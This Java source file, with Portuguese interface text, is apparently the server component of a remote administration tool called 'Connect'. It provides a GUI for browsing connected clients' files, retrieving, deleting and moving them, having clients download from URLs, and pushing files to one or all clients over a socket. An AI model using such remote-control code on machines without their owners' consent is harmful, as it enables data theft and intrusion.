package br.com.introcdc.connect.server.components;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 18:21
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.components.InstallComponents;
import br.com.introcdc.connect.server.ConnectServer;
import br.com.introcdc.connect.server.components.settings.FileInfo;
import br.com.introcdc.connect.server.connection.ClientHandler;
import br.com.introcdc.connect.server.gui.ServerGUI;

import javax.swing.*;
import java.awt.*;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.List;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class ServerFileComponents {

    public static final Pattern LINE_PATTERN = Pattern.compile("^(?<slash>/?)\\[(?<index>\\d+)\\]\\s+(?<name>.*?)\\s*\\|\\s*(?<info>.+)$");
    public static JFrame FRAME = null;

    private static void handleCommand(String cmd, boolean client) {
        if (client) {
            ServerGUI.sendDirectCommand(cmd);
        } else {
            ConnectServer.handleCommand(cmd);
        }
    }

    public static void createFileNavigator(List<FileInfo> fileList, String title) {
        fileList.sort(Comparator.comparing(FileInfo::isDirectory, Comparator.reverseOrder())
                .thenComparing(FileInfo::getFileName, String.CASE_INSENSITIVE_ORDER));
        fileList.add(0, new FileInfo(true, "Voltar", "..", -1));

        int extended = -1;
        if (FRAME != null) {
            FRAME.dispose();
            extended = FRAME.getExtendedState();
        }
        FRAME = new JFrame(title);
        FRAME.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        FRAME.setSize(1500, 600);
        FRAME.setLocationRelativeTo(null);

        try {
            ImageIcon icon = new ImageIcon(ConnectServer.class.getResource("/eye.png"));
            FRAME.setIconImage(icon.getImage());
        } catch (Exception ignored) {
        }

        try {
            UIManager.setLookAndFeel("javax.swing.plaf.nimbus.NimbusLookAndFeel");
            if (ServerGUI.DARK_MODE) {
                UIManager.put("control", new Color(60, 63, 65));
                UIManager.put("text", Color.WHITE);
                UIManager.put("nimbusBase", new Color(18, 30, 49));
                UIManager.put("nimbusFocus", new Color(115, 164, 209));
                UIManager.put("nimbusLightBackground", new Color(60, 63, 65));
                UIManager.put("info", new Color(60, 63, 65));
                UIManager.put("nimbusSelectionBackground", new Color(104, 93, 156));
                UIManager.put("nimbusSelectedText", Color.WHITE);
                UIManager.put("nimbusDisabledText", Color.GRAY);
                UIManager.put("OptionPane.background", new Color(60, 63, 65));
                UIManager.put("Panel.background", new Color(60, 63, 65));
                UIManager.put("TextField.background", new Color(69, 73, 74));
                UIManager.put("TextField.foreground", Color.WHITE);
                UIManager.put("TextArea.background", new Color(69, 73, 74));
                UIManager.put("TextArea.foreground", Color.WHITE);
                UIManager.put("ComboBox.background", new Color(69, 73, 74));
                UIManager.put("ComboBox.foreground", Color.WHITE);
                UIManager.put("Button.background", new Color(77, 77, 77));
                UIManager.put("Button.foreground", Color.WHITE);
                SwingUtilities.updateComponentTreeUI(FRAME);
            }
        } catch (Exception ignored) {
        }

        JPanel mainPanel = new JPanel(new BorderLayout(10, 10));
        mainPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        JPanel gridPanel = new JPanel(new GridLayout(0, 3, 10, 10));

        AtomicReference<JPanel> previouslySelectedCard = new AtomicReference<>(null);
        AtomicReference<FileInfo> selectedFileInfo = new AtomicReference<>(null);

        for (FileInfo fileInfo : fileList) {
            JPanel card = createFileCard(fileInfo);

            card.addMouseListener(new MouseAdapter() {
                @Override
                public void mouseClicked(MouseEvent event) {
                    if (event.getClickCount() == 2) {
                        if (fileInfo.isDirectory()) {
                            if (fileInfo.getIndex() == -1) {
                                handleCommand("cd ..", true);
                                handleCommand("ls", true);
                            } else {
                                handleCommand("cd i:" + fileInfo.getIndex(), true);
                                handleCommand("ls", true);
                            }
                        } else {
                            handleCommand("receive i:" + fileInfo.getIndex(), true);
                        }
                    } else if (event.getClickCount() == 1) {
                        JPanel oldCard = previouslySelectedCard.get();
                        if (oldCard != null) {
                            oldCard.setBorder(BorderFactory.createCompoundBorder(
                                    BorderFactory.createLineBorder(oldCard.getName().equalsIgnoreCase(InstallComponents.LOCAL_FILE) ?
                                            Color.RED : Color.GRAY, 1),
                                    BorderFactory.createEmptyBorder(5, 5, 5, 5)
                            ));
                        }
                        card.setBorder(BorderFactory.createCompoundBorder(
                                BorderFactory.createLineBorder(Color.BLUE, 2),
                                BorderFactory.createEmptyBorder(5, 5, 5, 5)
                        ));
                        previouslySelectedCard.set(card);
                        selectedFileInfo.set(fileInfo);
                    }
                }
            });

            gridPanel.add(card);
        }

        JScrollPane scrollPane = new JScrollPane(gridPanel);
        scrollPane.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_NEVER);
        scrollPane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED);

        JPanel bottomPanel = new JPanel(new GridLayout(1, 1, 5, 5));

        JPanel selectionButtonsPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 5));

        JButton updateButton = ServerGUI.createButton("Atualizar");
        updateButton.addActionListener(e -> handleCommand("ls", true));

        JButton deleteButton = ServerGUI.createButton("Deletar");
        deleteButton.addActionListener(event -> {
            FileInfo sel = selectedFileInfo.get();
            if (sel != null) {
                if (sel.getIndex() == -1) {
                    JOptionPane.showMessageDialog(FRAME, "Não é possível deletar esta pasta!", "Aviso", JOptionPane.ERROR_MESSAGE);
                    return;
                }
                int confirm = JOptionPane.showConfirmDialog(
                        FRAME,
                        "Você tem certeza que deseja deletar o item '" + sel.getFileName() + "'?",
                        "Confirmação de Deleção",
                        JOptionPane.YES_NO_OPTION,
                        JOptionPane.WARNING_MESSAGE
                );

                if (confirm == JOptionPane.YES_OPTION) {
                    handleCommand("del i:" + sel.getIndex(), true);
                    handleCommand("ls", true);
                }
            } else {
                JOptionPane.showMessageDialog(FRAME, "Nenhum item selecionado!", "Aviso", JOptionPane.WARNING_MESSAGE);
            }
        });

        JButton receiveButton = ServerGUI.createButton("Receber");
        receiveButton.addActionListener(e -> {
            FileInfo sel = selectedFileInfo.get();
            if (sel != null) {
                if (sel.getIndex() == -1) {
                    JOptionPane.showMessageDialog(FRAME, "Não é possível receber esta pasta!", "Aviso", JOptionPane.ERROR_MESSAGE);
                    return;
                }
                handleCommand("receive i:" + sel.getIndex(), true);
            } else {
                JOptionPane.showMessageDialog(FRAME, "Nenhum item selecionado!");
            }
        });

        JButton moveButton = ServerGUI.createButton("Mover");
        moveButton.addActionListener(e -> {
            FileInfo sel = selectedFileInfo.get();
            if (sel != null) {
                if (sel.getIndex() == -1) {
                    JOptionPane.showMessageDialog(FRAME, "Não é possível mover esta pasta!", "Aviso", JOptionPane.ERROR_MESSAGE);
                    return;
                }
                String destiny = JOptionPane.showInputDialog(FRAME,
                        "Digite o destino para mover o item '" + sel.getFileName() + "':",
                        "Mover Arquivo/Pasta",
                        JOptionPane.QUESTION_MESSAGE
                );

                if (destiny != null && !destiny.trim().isEmpty()) {
                    handleCommand("move i:" + sel.getIndex() + " " + destiny, true);
                    handleCommand("ls", true);
                }
            } else {
                JOptionPane.showMessageDialog(FRAME, "Nenhum item selecionado!", "Aviso", JOptionPane.WARNING_MESSAGE);
            }
        });

        JButton copyButton = ServerGUI.createButton("Copiar");
        copyButton.addActionListener(e -> {
            FileInfo sel = selectedFileInfo.get();
            if (sel != null) {
                if (sel.getIndex() == -1) {
                    JOptionPane.showMessageDialog(FRAME, "Não é possível copiar esta pasta!", "Aviso", JOptionPane.ERROR_MESSAGE);
                    return;
                }
                String destiny = JOptionPane.showInputDialog(FRAME,
                        "Digite o destino para copiar o item '" + sel.getFileName() + "':",
                        "Copiar Arquivo/Pasta",
                        JOptionPane.QUESTION_MESSAGE
                );

                if (destiny != null && !destiny.trim().isEmpty()) {
                    handleCommand("copy i:" + sel.getIndex() + " " + destiny, true);
                    handleCommand("ls", true);
                }
            } else {
                JOptionPane.showMessageDialog(FRAME, "Nenhum item selecionado!");
            }
        });

        JButton zipButton = ServerGUI.createButton("Zipar");
        zipButton.addActionListener(e -> {
            FileInfo sel = selectedFileInfo.get();
            if (sel != null) {
                if (sel.getIndex() == -1) {
                    JOptionPane.showMessageDialog(FRAME, "Não é possível zipar esta pasta!", "Aviso", JOptionPane.ERROR_MESSAGE);
                    return;
                }
                handleCommand("zip i:" + sel.getIndex(), true);
            } else {
                JOptionPane.showMessageDialog(FRAME, "Nenhum item selecionado!");
            }
        });

        JButton unzipButton = ServerGUI.createButton("Deszipar");
        unzipButton.addActionListener(e -> {
            FileInfo sel = selectedFileInfo.get();
            if (sel != null) {
                if (sel.getIndex() == -1) {
                    JOptionPane.showMessageDialog(FRAME, "Não é possível deszipar esta pasta!", "Aviso", JOptionPane.ERROR_MESSAGE);
                    return;
                }
                handleCommand("unzip i:" + sel.getIndex(), true);
            } else {
                JOptionPane.showMessageDialog(FRAME, "Nenhum item selecionado!");
            }
        });

        JButton fileInfoButton = ServerGUI.createButton("Detalhes");
        fileInfoButton.addActionListener(e -> {
            FileInfo sel = selectedFileInfo.get();
            if (sel != null) {
                if (sel.getIndex() == -1) {
                    JOptionPane.showMessageDialog(FRAME, "Não é possível ver detalhes desta pasta!", "Aviso", JOptionPane.ERROR_MESSAGE);
                    return;
                }
                handleCommand("fileinfo i:" + sel.getIndex(), true);
            } else {
                JOptionPane.showMessageDialog(FRAME, "Nenhum item selecionado!");
            }
        });

        JButton viewButton = ServerGUI.createButton("Visualizar");
        viewButton.addActionListener(e -> {
            FileInfo sel = selectedFileInfo.get();
            if (sel != null) {
                if (sel.getIndex() == -1) {
                    JOptionPane.showMessageDialog(FRAME, "Não é possível visualizar esta pasta!", "Aviso", JOptionPane.ERROR_MESSAGE);
                    return;
                }
                handleCommand("view i:" + sel.getIndex(), true);
            } else {
                JOptionPane.showMessageDialog(FRAME, "Nenhum item selecionado!");
            }
        });

        JButton sendFileButton = ServerGUI.createButton("Enviar Arquivo");
        sendFileButton.addActionListener(e -> {
            String fileName = JOptionPane.showInputDialog(FRAME,
                    "Digite o nome do arquivo para enviar:",
                    "Nome Arquivo/Pasta",
                    JOptionPane.QUESTION_MESSAGE
            );

            if (fileName != null && !fileName.trim().isEmpty()) {
                handleCommand("send " + fileName.trim(), true);
            }
        });

        JButton downloadButton = ServerGUI.createButton("Baixar Arquivo");
        downloadButton.addActionListener(e -> {
            String url = JOptionPane.showInputDialog(FRAME,
                    "Digite o url do arquivo para baixar:",
                    "URL",
                    JOptionPane.QUESTION_MESSAGE
            );

            if (url != null && !url.trim().isEmpty()) {
                handleCommand("download " + url.trim(), true);
            }
        });

        JButton createFolderButton = ServerGUI.createButton("Criar Pasta");
        createFolderButton.addActionListener(e -> {
            String fileName = JOptionPane.showInputDialog(FRAME,
                    "Digite o nome do pasta para criar:",
                    "Nome Pasta",
                    JOptionPane.QUESTION_MESSAGE
            );

            if (fileName != null && !fileName.trim().isEmpty()) {
                handleCommand("mkdir " + fileName.trim(), true);
                handleCommand("ls", true);
            }
        });

        JButton cdButton = ServerGUI.createButton("Entrar");
        cdButton.addActionListener(event -> {
            String fileName = JOptionPane.showInputDialog(FRAME,
                    "Digite o nome do pasta para entrar:",
                    "Nome Pasta",
                    JOptionPane.QUESTION_MESSAGE
            );

            if (fileName != null && !fileName.trim().isEmpty()) {
                handleCommand("cd " + fileName.trim(), true);
                handleCommand("ls", true);
            }
        });

        selectionButtonsPanel.add(cdButton);
        selectionButtonsPanel.add(updateButton);
        selectionButtonsPanel.add(fileInfoButton);
        selectionButtonsPanel.add(viewButton);
        selectionButtonsPanel.add(receiveButton);
        selectionButtonsPanel.add(sendFileButton);
        selectionButtonsPanel.add(moveButton);
        selectionButtonsPanel.add(copyButton);
        selectionButtonsPanel.add(deleteButton);
        selectionButtonsPanel.add(zipButton);
        selectionButtonsPanel.add(unzipButton);
        selectionButtonsPanel.add(downloadButton);
        selectionButtonsPanel.add(createFolderButton);

        bottomPanel.add(selectionButtonsPanel);

        mainPanel.add(scrollPane, BorderLayout.CENTER);
        mainPanel.add(bottomPanel, BorderLayout.SOUTH);

        FRAME.setContentPane(mainPanel);
        FRAME.setVisible(true);
        if (extended != -1) {
            FRAME.setExtendedState(extended);
        }
    }

    private static JPanel createFileCard(FileInfo fileInfo) {
        // Cria o painel do card
        JPanel card = new JPanel(new BorderLayout());
        card.setName(fileInfo.getFileName());
        card.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createLineBorder(fileInfo.getFileName().equalsIgnoreCase(InstallComponents.LOCAL_FILE) ? Color.RED : Color.GRAY, 1),
                BorderFactory.createEmptyBorder(5, 5, 5, 5)
        ));

        // Define o tamanho fixo para o card
        card.setPreferredSize(new Dimension(145, 100)); // Largura: 150px, Altura: 100px
        card.setMaximumSize(new Dimension(145, 100));
        card.setMinimumSize(new Dimension(145, 100));

        // Ícone (emoji ou símbolo para arquivo/pasta)
        String iconText = fileInfo.isDirectory() ? "\uD83D\uDCC1" : "\uD83D\uDCC4";
        JLabel iconLabel = new JLabel(iconText);
        iconLabel.setFont(new Font("SansSerif", Font.PLAIN, 36)); // Reduzimos o tamanho do ícone
        iconLabel.setHorizontalAlignment(SwingConstants.CENTER);

        // Nome do arquivo/pasta
        JLabel fileNameLabel = new JLabel(fileInfo.getFileName(), SwingConstants.CENTER);
        fileNameLabel.setFont(new Font("SansSerif", Font.PLAIN, 12));
        fileNameLabel.setPreferredSize(new Dimension(150, 20)); // Garantir que o nome não estique muito

        // Informações adicionais (ex.: tamanho ou quantidade de arquivos)
        JLabel extraLabel = new JLabel(fileInfo.getFileSize(), SwingConstants.CENTER);
        extraLabel.setFont(new Font("SansSerif", Font.ITALIC, 10));

        // Painel para as legendas (nome e extra)
        JPanel labelPanel = new JPanel(new GridLayout(2, 1));
        labelPanel.add(fileNameLabel);
        labelPanel.add(extraLabel);

        // Adiciona os componentes ao card
        card.add(iconLabel, BorderLayout.CENTER);
        card.add(labelPanel, BorderLayout.SOUTH);

        return card;
    }

    public static void readFolder(File folder, Map<String, String> files, String base) {
        for (File file : folder.listFiles()) {
            if (file.isDirectory()) {
                readFolder(file, files, base + "/" + file.getName());
            } else {
                files.put(base + "/" + file.getName(), base + "/" + file.getName());
            }
        }
    }

    public static void createZip(File folder, File destiny) throws IOException {
        Map<String, String> files = new HashMap<>();
        readFolder(folder, files, folder.getName());
        createZip(files, destiny);
    }

    public static void createZip(Map<String, String> files, File destiny) throws IOException {
        System.out.println(destiny.getAbsolutePath());
        if (!destiny.exists()) {
            destiny.createNewFile();
        }

        int BUFFER = 2048;
        BufferedInputStream origin;
        FileOutputStream dest = new FileOutputStream(destiny);
        ZipOutputStream out = new ZipOutputStream(new BufferedOutputStream(dest));
        for (String file : files.keySet()) {
            byte[] data = new byte[BUFFER];
            FileInputStream fileInput = new FileInputStream(file);
            origin = new BufferedInputStream(fileInput, BUFFER);
            ZipEntry entry = new ZipEntry(files.get(file));
            out.putNextEntry(entry);
            int count;
            while ((count = origin.read(data, 0, BUFFER)) != -1) {
                out.write(data, 0, count);
                out.flush();
            }
            origin.close();
        }
        out.flush();
        out.close();
    }

    public static void deleteFile(File file) {
        if (file.exists()) {
            deleteFile(file.toPath());
        }
    }

    public static void deleteFile(Path path) {
        try {
            Files.walkFileTree(path, new SimpleFileVisitor<Path>() {

                private FileVisitResult handleException(IOException exception) {
                    return FileVisitResult.TERMINATE;
                }

                @Override
                public FileVisitResult postVisitDirectory(Path dir, IOException exception) throws IOException {
                    if (exception != null) {
                        return handleException(exception);
                    }
                    Files.delete(dir);
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
                    Files.delete(file);
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult visitFileFailed(Path file, IOException exception) {
                    return handleException(exception);
                }
            });
        } catch (Exception ignored) {
        }
    }

    public static void sendFile(String input) {
        File file = new File("connect/" + input);
        if (file.exists()) {
            boolean temp = false;
            if (file.isDirectory()) {
                temp = true;
                ConnectServer.msg("Pasta " + file.getName() + " sendo zipada para envio...");
                try {
                    ServerFileComponents.createZip(file, new File("connect/file.zip"));
                } catch (Exception exception) {
                    ConnectServer.msg("Ocorreu um erro ao zipar a pasta " + file.getName());
                    return;
                }
                file = new File("connect/file.zip");
            }
            ConnectServer.msg("Preparando-se para enviar arquivo" + (ConnectServer.SELECTED_CLIENT == -1 ? " para todos os clientes..." : "..."));
            File fileToSend = file;
            boolean temporary = temp;
            ConnectServer.EXECUTOR.schedule(() -> new Thread(() -> {
                int toSend = 1;
                if (ConnectServer.SELECTED_CLIENT == -1) {
                    if (ConnectServer.CLIENTS.isEmpty()) {
                        ConnectServer.msg("Não possui nenhum cliente conectado no momento!");
                    } else {
                        Collection<ClientHandler> clientHandlerList = new ArrayList<>(ConnectServer.CLIENTS.values());
                        toSend = clientHandlerList.size();
                        for (ClientHandler clientHandler : clientHandlerList) {
                            clientHandler.send("send " + fileToSend.getName());
                        }
                    }
                } else {
                    ClientHandler client = ConnectServer.CLIENTS.get(ConnectServer.SELECTED_CLIENT);
                    client.send("send " + fileToSend.getName());
                }

                try (ServerSocket serverSocket = new ServerSocket(Connect.PORT + 4)) {
                    int connected = 0;
                    while (connected < toSend) {
                        try (Socket clientSocket = serverSocket.accept();
                             DataOutputStream dos = new DataOutputStream(clientSocket.getOutputStream());
                             BufferedInputStream bis = new BufferedInputStream(new FileInputStream(fileToSend))) {
                            connected++;
                            try {
                                dos.writeUTF(fileToSend.getName());
                                dos.flush();
                                dos.writeUTF(fileToSend.getName());
                                dos.flush();
                                dos.writeUTF("temp:" + temporary);
                                dos.flush();

                                byte[] buffer = new byte[4096];
                                int bytesRead;
                                while ((bytesRead = bis.read(buffer)) != -1) {
                                    dos.write(buffer, 0, bytesRead);
                                    ConnectServer.addBytes(fileToSend.length(), true);
                                }
                            } catch (Exception exception) {
                                ConnectServer.msg("Ocorreu um erro ao enviar um arquivo via socket pós conexão!");
                            }
                        } catch (Exception exception) {
                            ConnectServer.msg("Ocorreu um erro ao enviar um arquivo via socket...");
                        }
                    }

                    if (temporary) {
                        ServerFileComponents.deleteFile(fileToSend);
                    }
                } catch (Exception exception) {
                    ConnectServer.msg("Ocorreu um erro ao enviar o arquivo para o cliente! (" + exception.getMessage() + ")");
                }
            }).start(), 100, TimeUnit.MILLISECONDS);
        } else {
            ConnectServer.msg("Arquivo não encontrado para envio!");
        }
    }

}
